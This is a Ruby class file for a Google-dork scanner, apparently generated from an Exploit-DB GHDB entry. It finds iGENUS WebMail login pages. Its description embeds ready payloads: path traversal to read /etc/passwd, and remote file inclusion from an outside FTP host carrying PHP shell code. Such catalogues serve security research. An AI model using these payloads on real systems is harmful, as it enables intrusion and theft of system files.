module Dorks
   class Dork1308 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1308",
            ghdb_url: "https://www.exploit-db.com/ghdb/1308",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2006-02-28",
            author: "anonymous",
            dork: <<~EDORK,
intitle:"igenus webmail login"
EDORK
            description: <<~EDESC
intitle:"igenus webmail login"example exploit: http://[target]/[path]/?Lang=../../../../../../../../../../etc/passwd%00 http://[target]/[path]/config/config_inc.php?SG_HOME=../../../../../../../../../../etc/passwd%00 also, on php5: http://[target]/[path]/config/config_inc.php?SG_HOME=ftp://username:password@somehost.com&cmd=dir where on somehost.com you have a php shell code in a ".config" file exploit code: http://retrogod.altervista.org/igenus_202_xpl_pl.html
iGENUS WebMail 2.0.2 (config_inc.php) Remote Code Execution - CVE: 2006-1031: https://www.exploit-db.com/exploits/1527
EDESC
         })

      end
   end
end
